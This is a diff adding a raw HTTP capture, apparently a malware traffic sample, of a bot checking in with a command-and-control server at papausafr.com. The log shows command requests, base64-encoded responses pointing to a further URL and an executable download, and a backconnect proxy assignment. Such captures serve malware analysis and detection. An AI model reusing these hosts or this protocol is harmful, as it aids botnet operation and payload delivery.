@@ -1,0 +1,153 @@
+GET /psin.php HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:32 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+1d
+http://papausafr.com/holo.php
+0
+
+GET /holo.php?command=getip HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:32 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+c
+147.32.83.56
+0
+
+GET /holo.php?command=getid HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:33 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+a
+1494363983
+0
+
+GET /holo.php?command=ghl&id=1494363983 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:33 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+2c
+aHR0cDovL3ZpYmVycG9ydGVzYWwuY29tL2dvLnBocA==
+0
+
+GET /holo.php?command=dl&id=1494363983 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:33 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+4
+fA==
+0
+
+GET /holo.php?command=version&id=1494363983 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:34 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+2c
+NS42fGh0dHA6Ly9wYXBhdXNhZnIuY29tLzU2LmV4ZQ==
+0
+
+GET /holo.php?command=getip HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:34 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+c
+147.32.83.56
+0
+
+GET /holo.php?command=getbackconnect HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:35 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+11
+194.247.12.49:495
+0
+
+GET /holo.php?command=update2&id=1494363983&ip=194.247.12.49&port=38926 HTTP/1.1
+User-Agent: pb
+Host: papausafr.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Date: Wed, 04 Mar 2015 14:36:36 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.37
+
+2
+Ok
+0
+
